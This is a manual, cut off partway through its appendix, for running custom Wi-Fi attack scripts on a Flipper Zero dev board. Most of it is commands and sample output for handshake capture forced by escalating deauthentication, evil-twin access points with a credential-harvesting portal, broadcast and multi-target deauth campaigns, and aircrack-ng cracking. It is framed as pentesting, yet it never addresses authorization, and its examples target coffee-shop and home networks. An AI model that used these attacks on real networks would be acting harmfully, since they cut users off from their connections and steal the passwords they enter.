# Flipper Zero BlackHat Pentesting Complete Manual

**Version 1.0 | For BlackHat OS on WiFi Dev Board**

---

## Table of Contents

1. [Quick Reference](#quick-reference)
2. [Access Methods](#access-methods)
3. [SSH Interface - Full Control](#ssh-interface---full-control)
4. [Flipper App Interface - One-Touch Operations](#flipper-app-interface---one-touch-operations)
5. [Complete Command Reference](#complete-command-reference)
6. [Workflow Examples](#workflow-examples)
7. [Troubleshooting](#troubleshooting)
8. [File Locations](#file-locations)

---

## Quick Reference

### SSH vs Flipper App Comparison

| Feature | SSH | Flipper App |
|---------|-----|-------------|
| **Access** | Computer terminal | Flipper device |
| **Display** | Full color terminal | Small monochrome screen |
| **Control** | Complete, all parameters | Simplified, preset configs |
| **Output** | Real-time, detailed | Basic status messages |
| **Best For** | Custom attacks, debugging | Quick operations, field use |
| **Speed** | Fastest | Moderate |
| **Complexity** | High | Low |

### When to Use SSH
- Custom scan durations or parameters
- Debugging failed operations
- Viewing detailed logs and results
- Multi-target batch operations
- Advanced attack configurations

### When to Use Flipper App
- Quick reconnaissance in the field
- One-touch standard attacks
- When laptop isn't available
- Simple monitoring operations
- Learning the tools

---

## Access Methods

### Method 1: SSH (Full Control)

**Requirements:**
- WiFi Dev Board connected to network
- IP address (e.g., 192.168.178.122)
- SSH client (built into Mac/Linux, PuTTY for Windows)

**Connect:**
```bash
ssh root@192.168.178.122
# Password: your_password
```

**Quick Test:**
```bash
uname -a
# Should show: Linux flipper-blackhat 6.15.0
```

---

### Method 2: Flipper App Interface

**Requirements:**
- Flipper Zero with WiFi Dev Board attached
- BlackHat OS installed on dev board
- WiFi connection established

**Access Steps:**
1. On Flipper: **Apps** → **GPIO** → **WiFi Dev Board**
2. Select **Scripts** menu
3. Choose script from list
4. Press OK to execute

**Quick Test:**
```
bh script scan
# Should list available scripts including wifi_recon.py
```

---

## SSH Interface - Full Control

### 1. Automated Recon Pipeline

**Script:** `/root/01-recon-pipeline.sh`

**Full Syntax:**
```bash
./01-recon-pipeline.sh [INTERFACE] [SCAN_DURATION] [OUTPUT_DIR]
```

**Parameters:**
- `INTERFACE` - WiFi interface (default: wlan0)
- `SCAN_DURATION` - Scan time in seconds (default: 10)
- `OUTPUT_DIR` - Where to save results (default: /root/recon)

**Examples:**

```bash
# Quick 10-second scan
./01-recon-pipeline.sh

# Thorough 60-second scan
./01-recon-pipeline.sh wlan0 60

# Custom output location
./01-recon-pipeline.sh wlan0 30 /mnt/sdcard/recon

# Full custom
./01-recon-pipeline.sh wlan1 120 /root/my-scan
```

**Output Files:**
```
/root/recon/
├── recon_TIMESTAMP.log          # Detailed operation log
├── recon_TIMESTAMP.json         # Structured network data
├── recon_TIMESTAMP.csv          # Networks in CSV format
├── report_TIMESTAMP.txt         # Human-readable summary
└── target_TIMESTAMP.txt         # Selected target (if chosen)
```

**Interactive Features:**
- Ranking by signal strength
- Encryption type color coding
- Target selection menu
- Automatic report generation

**Sample Output:**
```
═══════════════════════════════════════════════════════════════
Rank  Signal  Channel  Encryption    SSID
═══════════════════════════════════════════════════════════════
1     -42     6        WPA2          CoffeeShop_WiFi
2     -58     11       WPA2-PSK      HomeNetwork
3     -65     1        WPA3          SecureOffice
═══════════════════════════════════════════════════════════════

Select target by rank (or 'q' to quit, 's' to skip):
>
```

---

### 2. Smart Handshake Capture

**Script:** `/root/02-handshake-capture.sh`

**Full Syntax:**
```bash
./02-handshake-capture.sh <BSSID> <CHANNEL> <ESSID> [INTERFACE] [OUTPUT_DIR] [MAX_ATTEMPTS]
```

**Required Parameters:**
- `BSSID` - Target AP MAC address (e.g., AA:BB:CC:DD:EE:FF)
- `CHANNEL` - WiFi channel (1-14)
- `ESSID` - Network name (quoted if contains spaces)

**Optional Parameters:**
- `INTERFACE` - WiFi interface (default: wlan0)
- `OUTPUT_DIR` - Output directory (default: /root/captures)
- `MAX_ATTEMPTS` - Maximum capture attempts (default: 5)

**Examples:**

```bash
# Basic handshake capture
./02-handshake-capture.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi'

# With custom interface
./02-handshake-capture.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan1

# Custom output location and 3 attempts only
./02-handshake-capture.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 /mnt/sdcard/caps 3

# Maximum attempts for difficult targets
./02-handshake-capture.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 /root/captures 10
```

**Deauth Escalation Strategy:**
```
Attempt 1: 5 deauth packets
Attempt 2: 10 deauth packets
Attempt 3: 20 deauth packets
Attempt 4: 50 deauth packets
Attempt 5+: 100 deauth packets
```

**Output Files:**
```
/root/captures/
├── handshake_TIMESTAMP-01.cap   # Captured packets (use with aircrack-ng)
├── handshake_TIMESTAMP-01.csv   # Network/client details
├── capture_TIMESTAMP.log        # Detailed capture log
└── report_TIMESTAMP.txt         # Summary with next steps
```

**Success Output:**
```
═══════════════════════════════════════════════════════════════
  ✓✓✓ HANDSHAKE CAPTURED SUCCESSFULLY! ✓✓✓
═══════════════════════════════════════════════════════════════

Next Steps:
  Crack the handshake with:
    aircrack-ng handshake_TIMESTAMP-01.cap -w /path/to/wordlist.txt
```

**Troubleshooting:**
```bash
# No clients connected?
# Wait or try again when clients are active

# Clients detected but handshake fails?
# Increase MAX_ATTEMPTS or get closer to target

# Verify handshake manually:
aircrack-ng /root/captures/handshake_*-01.cap
```

---

### 3. Evil Twin Attack

**Script:** `/root/03-evil-twin.sh`

**Full Syntax:**
```bash
./03-evil-twin.sh <BSSID> <CHANNEL> <ESSID> [ATTACK_IFACE] [INET_IFACE] [ENABLE_PORTAL] [OUTPUT_DIR]
```

**Required Parameters:**
- `BSSID` - Target AP MAC to clone
- `CHANNEL` - WiFi channel
- `ESSID` - Network name to clone

**Optional Parameters:**
- `ATTACK_IFACE` - Interface for rogue AP (default: wlan0)
- `INET_IFACE` - Interface with internet (default: wlan1)
- `ENABLE_PORTAL` - Enable credential capture [true/false] (default: false)
- `OUTPUT_DIR` - Output directory (default: /root/evil-twin)

**Examples:**

```bash
# Basic evil twin (no portal)
./03-evil-twin.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi'

# With evil portal for credential capture
./03-evil-twin.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 wlan1 true

# Custom output location
./03-evil-twin.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 wlan1 false /mnt/sdcard/evil

# Single interface mode (no internet passthrough)
./03-evil-twin.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 wlan0 false
```

**Dual Interface Setup:**
```
wlan0 → Rogue AP broadcasting
        Continuous deauth to legitimate AP
        Client connection monitoring

wlan1 → Internet connection (if different from wlan0)
        NAT/routing for passthrough
        Maintains SSH connectivity
```

**Interactive Confirmation:**
```
⚠ This will launch a rogue access point and deauth attack.
Continue? (yes/no): yes
```

**Running Status:**
```
═══════════════════════════════════════════════════════════════
  Evil Twin Active - Monitoring Connections
═══════════════════════════════════════════════════════════════

Target: CoffeeWiFi (AA:BB:CC:DD:EE:FF)
Channel: 6
Interface: wlan0
Portal: Enabled

Waiting for clients to connect...
(Press Ctrl+C to stop)

[10:45:23] 1 client(s) connected
  └─ 11:22:33:44:55:66
[10:47:11] 2 client(s) connected
  └─ 11:22:33:44:55:66
  └─ AA:BB:CC:DD:EE:77
```

**Stopping:**
```bash
# Press Ctrl+C
# Or from another SSH session:
pkill -f evil-twin
```

**Credential Capture:**
When `ENABLE_PORTAL=true`, captured credentials saved to:
```
/var/log/evil-portal/
/root/evil-twin/credentials_TIMESTAMP.txt
```

---

### 4. Deauth Campaign Manager

**Script:** `/root/04-deauth-campaign.sh`

**Full Syntax:**
```bash
./04-deauth-campaign.sh <MODE> [TARGET_FILE] [INTERFACE] [INTERVAL] [PACKETS] [OUTPUT_DIR]
```

**Modes:**

#### Mode 1: Scan
```bash
./04-deauth-campaign.sh scan [INTERFACE]

# Examples:
./04-deauth-campaign.sh scan
./04-deauth-campaign.sh scan wlan0
```
Lists targets using `bh deauth_scan` for manual selection.

#### Mode 2: Single Target
```bash
./04-deauth-campaign.sh single <BSSID> [INTERFACE] [INTERVAL] [PACKETS]

# Examples:
# Basic - 20 packets every 10 seconds
./04-deauth-campaign.sh single AA:BB:CC:DD:EE:FF

# Aggressive - 50 packets every 5 seconds
./04-deauth-campaign.sh single AA:BB:CC:DD:EE:FF wlan0 5 50

# Stealthy - 10 packets every 30 seconds
./04-deauth-campaign.sh single AA:BB:CC:DD:EE:FF wlan0 30 10
```

#### Mode 3: Multi-Target
```bash
./04-deauth-campaign.sh multi <TARGET_FILE> [INTERFACE] [INTERVAL] [PACKETS]

# Example:
./04-deauth-campaign.sh multi /root/targets.txt wlan0 15 30
```

**Target File Format:**
```
# targets.txt (CSV format)
BSSID,CHANNEL,ESSID
AA:BB:CC:DD:EE:FF,6,CoffeeWiFi
11:22:33:44:55:66,11,HomeNetwork
AA:11:BB:22:CC:33,1,OfficeAP
```

#### Mode 4: Broadcast
```bash
./04-deauth-campaign.sh broadcast [INTERFACE] [INTERVAL] [PACKETS]

# Examples:
# Standard broadcast
./04-deauth-campaign.sh broadcast

# Aggressive broadcast - 100 packets every 5 seconds
./04-deauth-campaign.sh broadcast wlan0 5 100
```

**⚠️ WARNING:** Broadcast mode attacks ALL visible connections!

**Campaign Output:**
```
═══════════════════════════════════════════════════════════════
[Round 1] 10:45:23 - Sending 20 deauth packets...
  ✓ Deauth round completed (Total: 1)
  Waiting 10s before next round...

[Round 2] 10:45:43 - Sending 20 deauth packets...
  ✓ Deauth round completed (Total: 2)
  Waiting 10s before next round...
```

**Statistics Output:**
```
/root/deauth-campaign/
├── deauth_TIMESTAMP.log         # Detailed operation log
├── stats_TIMESTAMP.csv          # Round-by-round statistics
└── report_TIMESTAMP.txt         # Summary report
```

**CSV Statistics Format:**
```csv
Timestamp,Target,Round,Packets Sent,Status
2025-10-28T10:45:23Z,AA:BB:CC:DD:EE:FF,1,20,SUCCESS
2025-10-28T10:45:43Z,AA:BB:CC:DD:EE:FF,2,20,SUCCESS
```

---

### 5. Network Health Monitor

**Script:** `/root/05-network-monitor.sh`

**Full Syntax:**
```bash
./05-network-monitor.sh [INTERFACE] [SCAN_INTERVAL] [OUTPUT_DIR] [WATCH_MACS]
```

**Parameters:**
- `INTERFACE` - WiFi interface (default: wlan0)
- `SCAN_INTERVAL` - Seconds between scans (default: 30)
- `OUTPUT_DIR` - Output directory (default: /root/monitor)
- `WATCH_MACS` - Comma-separated MACs to alert on (optional)

**Examples:**

```bash
# Basic monitoring - 30 second scans
./05-network-monitor.sh

# Fast monitoring - 15 second scans
./05-network-monitor.sh wlan0 15

# Watch for specific devices
./05-network-monitor.sh wlan0 30 /root/monitor AA:BB:CC:DD:EE:FF,11:22:33:44:55:66

# Custom everything
./05-network-monitor.sh wlan1 10 /mnt/sdcard/monitor AA:BB:CC:DD:EE:FF
```

**Live Display:**
```
═══════════════════════════════════════════════════════════════
            Network Health Monitor v1.0
          Continuous Surveillance & Anomaly Detection
═══════════════════════════════════════════════════════════════

Monitor Status
─────────────────────────────────────────────────────────────
Interface:      wlan0
Scan Interval:  15s
Networks:       5
Time:           2025-10-28 10:45:23
─────────────────────────────────────────────────────────────

Active Networks (Last 15s)
─────────────────────────────────────────────────────────────
AA:BB:CC:DD:EE:FF - Signal: -45 dBm
11:22:33:44:55:66 - Signal: -62 dBm
AA:11:BB:22:CC:33 - Signal: -58 dBm
─────────────────────────────────────────────────────────────

Press Ctrl+C to stop monitoring
```

**Alert Types:**
```
[ALERT] NEW NETWORK: CoffeeWiFi (AA:BB:CC:DD:EE:FF) on channel 6
[ALERT] NETWORK DISAPPEARED: AA:BB:CC:DD:EE:FF
[ALERT] SIGNAL CHANGE: CoffeeWiFi (AA:BB:CC:DD:EE:FF) - -45dBm → -62dBm
[ALERT] WATCHED MAC DETECTED: AA:BB:CC:DD:EE:FF (CoffeeWiFi)
```

**Database Format:**
```
/root/monitor/networks.db
# BSSID,ESSID,Channel,Encryption,FirstSeen,LastSeen
AA:BB:CC:DD:EE:FF,CoffeeWiFi,6,WPA2,2025-10-28T10:30:00Z,2025-10-28T10:45:00Z
```

**Alert Log:**
```
/root/monitor/alerts_TIMESTAMP.log
[2025-10-28 10:30:15] ALERT: NEW NETWORK: CoffeeWiFi (AA:BB:CC:DD:EE:FF) on channel 6
[2025-10-28 10:32:45] ALERT: WATCHED MAC DETECTED: AA:BB:CC:DD:EE:FF (CoffeeWiFi)
```

---

## Flipper App Interface - One-Touch Operations

### Accessing Scripts from Flipper

**Navigation:**
1. **Apps** → **GPIO** → **WiFi Dev Board**
2. Select **Scripts**
3. Choose from menu

**Or via command:**
```
bh script scan          # List available scripts
bh script run <name>    # Run a script
```

---

### Flipper Script 1: wifi_recon.py

**Location:** `/mnt/scripts/wifi_recon.py`

**Description:** Automated 30-second WiFi reconnaissance

**Run From Flipper:**
```
bh script run wifi_recon
```

**What It Does:**
- Scans for 30 seconds
- Discovers all nearby networks
- Ranks by signal strength
- Saves to `/root/recon/`

**Flipper Display:**
```
=== WiFi Reconnaissance ===
Starting 30-second scan...

[SUCCESS] Scan completed!
Results: /root/recon/

View on SSH:
  cat /root/recon/recon_*.csv
```

**No Configuration Required** ✓

**View Results Later:**
```bash
# SSH into device
ssh root@192.168.178.122
cat /root/recon/recon_*.csv
# Or download files
scp root@192.168.178.122:/root/recon/* ./
```

---

### Flipper Script 2: capture_handshake.py

**Location:** `/mnt/scripts/capture_handshake.py`

**Description:** Automated handshake capture with 3 attempts

**Run From Flipper:**
```
bh script run capture_handshake
```

**Prerequisites:**
Must configure target first via SSH:

```bash
# SSH into device
ssh root@192.168.178.122

# Create target configuration
cat > /root/target.conf << EOF
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=CoffeeWiFi
EOF

# Exit SSH
exit
```

**Flipper Display:**
```
=== Handshake Capture ===
Target: CoffeeWiFi
BSSID:  AA:BB:CC:DD:EE:FF
Channel: 6

Starting capture (max 3 attempts)...

[SUCCESS] Handshake captured!
File: /root/captures/handshake_*.cap
```

**Or if no target configured:**
```
ERROR: No target configured!
Create /root/target.conf with:
  BSSID=AA:BB:CC:DD:EE:FF
  CHANNEL=6
  ESSID=TargetNetwork
```

**Configuration Required** - See [Target Configuration](#target-configuration)

---

### Flipper Script 3: evil_twin.py

**Location:** `/mnt/scripts/evil_twin.py`

**Description:** Launch evil twin attack (no portal by default)

**Run From Flipper:**
```
bh script run evil_twin
```

**Prerequisites:**
Configure target via SSH (same as handshake capture)

**Flipper Display:**
```
=== Evil Twin Attack ===
Cloning: CoffeeWiFi
BSSID: AA:BB:CC:DD:EE:FF
Channel: 6

Starting rogue AP...
(Stop from Flipper or Ctrl+C via SSH)
```

**Stopping:**
- Press Back button on Flipper
- Or SSH: `pkill -f evil-twin`

**Note:** Runs without credential portal. For portal, use SSH directly.

**Configuration Required** - See [Target Configuration](#target-configuration)

---

### Flipper Script 4: deauth_target.py

**Location:** `/mnt/scripts/deauth_target.py`

**Description:** Quick deauth attack on configured target

**Run From Flipper:**
```
bh script run deauth_target
```

**Prerequisites:**
Configure target via SSH

**Flipper Display:**
```
=== Deauth Attack ===
Target: CoffeeWiFi
BSSID: AA:BB:CC:DD:EE:FF

Sending 20 deauth packets...
```

**Configuration Required** - See [Target Configuration](#target-configuration)

---

### Flipper Script 5: network_monitor.py

**Location:** `/mnt/scripts/network_monitor.py`

**Description:** Continuous network monitoring (15-second intervals)

**Run From Flipper:**
```
bh script run network_monitor
```

**Flipper Display:**
```
=== Network Monitor ===
Monitoring WiFi networks...
Scan interval: 15 seconds

Press Ctrl+C to stop
```

**No Configuration Required** ✓

**Stopping:**
- Press Back on Flipper
- Or SSH: `pkill -f network_monitor`

**View Alerts Later:**
```bash
ssh root@192.168.178.122
cat /root/monitor/alerts_*.log
```

---

### Flipper Script 6: set_target.py

**Location:** `/mnt/scripts/set_target.py`

**Description:** View current target configuration

**Run From Flipper:**
```
bh script run set_target
```

**Flipper Display:**
```
=== Set Target Configuration ===

This script sets the target for attacks.
After setting, you can run:
  - capture_handshake.py
  - evil_twin.py
  - deauth_target.py

Usage:
  Edit /root/target.conf manually via SSH:
    BSSID=AA:BB:CC:DD:EE:FF
    CHANNEL=6
    ESSID=YourNetwork

Or run wifi_recon.py first to discover targets!

--- Current Target ---
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=CoffeeWiFi
```

---

### Target Configuration

**Required For:**
- `capture_handshake.py`
- `evil_twin.py`
- `deauth_target.py`

**Configuration File:** `/root/target.conf`

**Format:**
```
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=NetworkName
```

**How to Configure:**

**Method 1: Manual (via SSH)**
```bash
ssh root@192.168.178.122

cat > /root/target.conf << EOF
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=CoffeeWiFi
EOF

exit
```

**Method 2: After Recon**
```bash
# 1. Run wifi_recon from Flipper
bh script run wifi_recon

# 2. SSH in and check results
ssh root@192.168.178.122
cat /root/recon/recon_*.csv

# 3. Pick a target from CSV and create config
cat > /root/target.conf << EOF
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=TargetFromScan
EOF
```

**Method 3: Using nano editor**
```bash
ssh root@192.168.178.122
nano /root/target.conf

# Type:
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=YourNetwork

# Save: Ctrl+O, Enter
# Exit: Ctrl+X
```

---

## Complete Command Reference

### BlackHat OS Built-in Commands

```bash
# WiFi Management
bh wifi list <iface>              # List WiFi networks
bh wifi con <iface|stop>          # Connect/disconnect WiFi
bh wifi dev                       # List WiFi devices
bh wifi ap <iface|stop>           # Enable/disable Access Point
bh wifi ip                        # Get IP addresses

# Attack Commands
bh deauth <client> <ap> [iface]   # Deauth specific client
bh deauth_all <ap> [iface]        # Deauth all clients from AP
bh deauth_broadcast [iface]       # Deauth all associations
bh deauth_scan [iface]            # Scan and show deauth targets

# Evil Twin / Portal
bh evil_twin                      # Enable internet passthrough
bh evil_portal [stop]             # Enable/disable evil portal

# Kismet
bh kismet <iface|stop>            # Start/stop Kismet

# Configuration
bh set SSID '<ssid>'              # Set target SSID
bh set PASS '<password>'          # Set WiFi password
bh set AP_SSID '<ssid>'           # Set AP SSID
bh get                            # Get current settings

# Scripts
bh script scan                    # List available scripts
bh script run <script>            # Run a script

# System
bh ssh [stop]                     # Enable/disable SSH
bh test_inet                      # Test internet (ping google)
```

### Aircrack-ng Suite Commands

```bash
# Monitor Mode
airmon-ng start wlan0             # Enable monitor mode
airmon-ng stop wlan0              # Disable monitor mode
airmon-ng check                   # Check for interfering processes
airmon-ng check kill              # Kill interfering processes

# Scanning
airodump-ng wlan0                 # Scan all channels
airodump-ng --channel 6 wlan0     # Scan specific channel
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w output wlan0
                                  # Capture specific AP

# Deauth Attacks
aireplay-ng -0 10 -a <AP_MAC> wlan0
                                  # Deauth all clients (10 packets)
aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0
                                  # Deauth specific client

# Handshake Verification
aircrack-ng capture.cap           # Check for handshakes
aircrack-ng capture.cap -w wordlist.txt
                                  # Crack WPA/WPA2 handshake

# Fake Authentication (WEP)
aireplay-ng -1 0 -a <AP_MAC> wlan0
                                  # Fake auth for WEP attacks
```

### Network Interface Commands

```bash
# Interface Management
ip link show                      # List all interfaces
ip link set wlan0 up              # Bring interface up
ip link set wlan0 down            # Bring interface down

iwconfig                          # Show wireless interfaces
iwconfig wlan0                    # Show specific interface details
iw dev wlan0 info                 # Detailed interface info
iw dev wlan0 scan                 # Scan for networks

# Channel Management
iw dev wlan0 set channel 6        # Set channel
iwconfig wlan0 channel 6          # Alternative channel set

# Monitor Mode
iw dev wlan0 set monitor none     # Enable monitor mode
iw dev wlan0 set type managed     # Back to managed mode

# Station Info
iw dev wlan0 station dump         # Show connected clients (AP mode)
```

### File Operations

```bash
# View Results
cat /root/recon/recon_*.csv       # View recon results
less /root/recon/report_*.txt     # View report (scrollable)
tail -f /root/captures/capture_*.log
                                  # Follow capture log in real-time

# Download Files
# From your computer:
scp root@192.168.178.122:/root/captures/*.cap ./

# Copy entire directory
scp -r root@192.168.178.122:/root/recon ./recon_results

# Delete Old Files
rm /root/recon/*                  # Clear recon directory
rm /root/captures/*.cap           # Remove capture files
find /root -name "*.log" -mtime +7 -delete
                                  # Delete logs older than 7 days
```

### Process Management

```bash
# View Running Processes
ps aux | grep -E '(aireplay|airodump|hostapd)'
                                  # Show attack processes
pgrep -f evil-twin                # Find evil twin process

# Kill Processes
pkill -f aireplay                 # Kill all aireplay processes
pkill -f airodump                 # Kill all airodump processes
pkill -f evil-twin                # Kill evil twin script
kill <PID>                        # Kill specific process by ID
killall -9 hostapd                # Force kill all hostapd instances

# System
reboot                            # Reboot device
poweroff                          # Shutdown device
```

---

## Workflow Examples

### Workflow 1: Complete Reconnaissance to Capture

**Goal:** Discover networks, select target, capture handshake

**Via SSH (Full Control):**

```bash
# Step 1: SSH Connect
ssh root@192.168.178.122

# Step 2: Comprehensive scan (60 seconds)
./01-recon-pipeline.sh wlan0 60 /root/recon

# Step 3: Review results
cat /root/recon/recon_*.csv
# Find target: AA:BB:CC:DD:EE:FF,6,-45,WPA2,CoffeeWiFi,2

# Step 4: Capture handshake (5 attempts max)
./02-handshake-capture.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 /root/captures 5

# Step 5: Verify handshake
aircrack-ng /root/captures/handshake_*-01.cap

# Step 6: Download capture
# From your computer:
scp root@192.168.178.122:/root/captures/handshake_*-01.cap ./
```

**Via Flipper (Simplified):**

```
# Step 1: Run recon from Flipper
bh script run wifi_recon
# Wait 30 seconds

# Step 2: SSH to review results
ssh root@192.168.178.122
cat /root/recon/recon_*.csv

# Step 3: Configure target
cat > /root/target.conf << EOF
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=CoffeeWiFi
EOF
exit

# Step 4: Capture from Flipper
bh script run capture_handshake

# Step 5: Download via SSH
scp root@192.168.178.122:/root/captures/handshake_*.cap ./
```

---

### Workflow 2: Evil Twin with Credential Capture

**Goal:** Clone network, capture credentials

**Via SSH Only (Portal requires SSH):**

```bash
# Step 1: Identify target
./01-recon-pipeline.sh wlan0 30

# Step 2: Launch evil twin with portal
./03-evil-twin.sh AA:BB:CC:DD:EE:FF 6 'CoffeeWiFi' wlan0 wlan1 true

# Confirmation prompt:
⚠ This will launch a rogue access point and deauth attack.
Continue? (yes/no): yes

# Step 3: Monitor connections in real-time
# Watch for clients connecting
# Let it run...

# Step 4: Stop (Ctrl+C) and review
cat /root/evil-twin/report_*.txt
cat /var/log/evil-portal/credentials.log

# Step 5: Cleanup
bh wifi ap stop
```

---

### Workflow 3: Continuous Monitoring with Alerts

**Goal:** Monitor area for new networks or specific devices

**Via SSH:**

```bash
# Monitor with watchlist (comma-separated MACs)
./05-network-monitor.sh wlan0 15 /root/monitor AA:BB:CC:DD:EE:FF,11:22:33:44:55:66

# Alerts will show:
# - New networks appearing
# - Watched MACs detected
# - Signal strength changes
# - Networks disappearing

# Let run for duration needed...

# Review alerts
cat /root/monitor/alerts_*.log

# Check database
cat /root/monitor/networks.db
```

**Via Flipper:**

```
# Start monitoring from Flipper
bh script run network_monitor

# Let it run...

# Later, SSH to review
ssh root@192.168.178.122
cat /root/monitor/alerts_*.log
```

---

### Workflow 4: Multi-Target Deauth Campaign

**Goal:** Attack multiple networks systematically

**Via SSH:**

```bash
# Step 1: Scan for targets
./04-deauth-campaign.sh scan wlan0

# Step 2: Create target file from results
cat > /root/targets.txt << EOF
AA:BB:CC:DD:EE:FF,6,CoffeeWiFi
11:22:33:44:55:66,11,HomeNetwork
AA:11:BB:22:CC:33,1,OfficeAP
EOF

# Step 3: Launch multi-target campaign
# 15 seconds between rounds, 30 packets each
./04-deauth-campaign.sh multi /root/targets.txt wlan0 15 30

# Step 4: Let run, then stop with Ctrl+C

# Step 5: Review statistics
cat /root/deauth-campaign/stats_*.csv
cat /root/deauth-campaign/report_*.txt
```

---

### Workflow 5: Quick Field Assessment

**Goal:** Fast recon and deauth test from Flipper

**Via Flipper (No SSH Needed):**

```
# 1. Quick recon
bh script run wifi_recon
# (30 seconds)

# 2. Later: SSH to check results
ssh root@192.168.178.122
cat /root/recon/recon_*.csv
# Pick target: AA:BB:CC:DD:EE:FF,6,CoffeeWiFi

# 3. Set target
cat > /root/target.conf << EOF
BSSID=AA:BB:CC:DD:EE:FF
CHANNEL=6
ESSID=CoffeeWiFi
EOF
exit

# 4. Back to Flipper: Quick deauth test
bh script run deauth_target
```

---

## Troubleshooting

### Connection Issues

**Problem:** Cannot SSH to device

**Solutions:**
```bash
# Check device IP
# On Flipper or via serial:
bh wifi ip

# Ping device
ping 192.168.178.122

# Check SSH service
# On device:
bh ssh

# Restart SSH
bh ssh stop
bh ssh

# Check firewall
iptables -L

# Reboot device
reboot
```

---

### Interface Issues

**Problem:** Interface not found or not working

**Solutions:**
```bash
# List interfaces
ip link show
bh wifi dev

# Bring interface up
ip link set wlan0 up

# Check if in use
ps aux | grep wlan0

# Kill interfering processes
airmon-ng check kill

# Restart interface
ip link set wlan0 down
sleep 2
ip link set wlan0 up

# Check driver
dmesg | grep wlan
```

---

### Monitor Mode Issues

**Problem:** Cannot enable monitor mode

**Solutions:**
```bash
# Kill interfering processes
airmon-ng check kill

# Manual monitor mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Verify
iwconfig wlan0

# Should show:
Mode:Monitor
```

---

### Handshake Capture Fails

**Problem:** No handshake captured after multiple attempts

**Diagnostics:**
```bash
# Check if clients connected to AP
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 wlan0
# Look for stations (clients) in bottom section

# Check deauth is working
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0
# Should see "ACKs" (acknowledgments)

# Verify channel
iw dev wlan0 info | grep channel
```

**Solutions:**
- Increase `MAX_ATTEMPTS` parameter
- Get physically closer to target AP
- Try when clients are more active (morning/evening)
- Ensure correct BSSID and channel
- Check if WPA3 (harder to capture)

---

### Evil Twin Issues

**Problem:** Clients not connecting to rogue AP

**Solutions:**
```bash
# Verify AP is running
bh wifi dev
iwconfig wlan0 | grep Mode
# Should show: Mode:Master

# Check if deauth is working
ps aux | grep aireplay

# Verify SSID matches exactly
bh get

# Increase deauth frequency (edit script)
# Change sleep 10 to sleep 5

# Check signal strength of your AP vs real AP
iwconfig wlan0 | grep "Signal level"
```

---

### Script Not Found (Flipper)

**Problem:** Script doesn't appear in `bh script scan`

**Solutions:**
```bash
# SSH to device
ssh root@192.168.178.122

# Check script location
ls -la /mnt/scripts/

# Verify permissions
chmod +x /mnt/scripts/*.py

# Check if file is valid Python
head -1 /mnt/scripts/wifi_recon.py
# Should show: #!/usr/bin/env python3

# Re-scan
bh script scan
```

---

### Process Won't Stop

**Problem:** Script keeps running after stop attempt

**Solutions:**
```bash
# Find process
ps aux | grep -E '(script_name|python)'

# Kill by name
pkill -f script_name
pkill -9 -f script_name  # Force kill

# Kill all attack processes
pkill -f aireplay
pkill -f airodump
pkill -f hostapd

# Nuclear option (kills all Python scripts)
killall python3

# Reboot if necessary
reboot
```

---

### Disk Space Issues

**Problem:** Device running out of space

**Check Usage:**
```bash
df -h
du -sh /root/*
```

**Clean Up:**
```bash
# Remove old captures
find /root/captures -name "*.cap" -mtime +7 -delete

# Remove old logs
find /root -name "*.log" -mtime +7 -delete

# Clean temporary files
rm -rf /tmp/*

# Remove specific directories
rm -rf /root/recon/*
rm -rf /root/captures/*
rm -rf /root/evil-twin/*
```

---

## File Locations

### Script Locations

```
SSH Scripts (Full Control):
/root/01-recon-pipeline.sh         15 KB
/root/02-handshake-capture.sh      17 KB
/root/03-evil-twin.sh              18 KB
/root/04-deauth-campaign.sh        18 KB
/root/05-network-monitor.sh        12 KB

Flipper Scripts (One-Touch):
/mnt/scripts/wifi_recon.py         540 bytes
/mnt/scripts/capture_handshake.py  1.3 KB
/mnt/scripts/evil_twin.py          851 bytes
/mnt/scripts/deauth_target.py      663 bytes
/mnt/scripts/network_monitor.py    299 bytes
/mnt/scripts/set_target.py         700 bytes
```

### Configuration Files

```
/root/target.conf           Target configuration for Flipper scripts
~/.bash_history             Command history
/etc/ssh/sshd_config        SSH server configuration
```

### Output Directories

```
/root/recon/                Reconnaissance results
  ├── recon_*.log           Operation logs
  ├── recon_*.json          Network data (JSON)
  ├── recon_*.csv           Network data (CSV)
  ├── report_*.txt          Summary reports
  └── target_*.txt          Selected targets

/root/captures/             Handshake captures
  ├── handshake_*-01.cap    Packet capture files
  ├── handshake_*-01.csv    Network/client data
  ├── capture_*.log         Capture operation logs
  └── report_*.txt          Capture summary

/root/evil-twin/            Evil twin logs
  ├── evil-twin_*.log       Operation logs
  ├── credentials_*.txt     Captured credentials
  └── report_*.txt          Attack summary

/root/deauth-campaign/      Deauth campaign data
  ├── deauth_*.log          Operation logs
  ├── stats_*.csv           Round statistics
  └── report_*.txt          Campaign summary

/root/monitor/              Network monitoring
  ├── monitor_*.log         Operation logs
  ├── networks.db           Network database
  └── alerts_*.log          Alert logs

/var/log/evil-portal/       Evil portal captures
  └── credentials.log       Portal-captured credentials
```

### Temporary Files

```
/tmp/scan_*                 Temporary scan files
/tmp/*.cap                  Temporary capture files
```

---

## Appendix: Quick Command Cards

### SSH Quick Commands

```bash
# Connect
ssh root@192.168.178.122

# Quick Recon
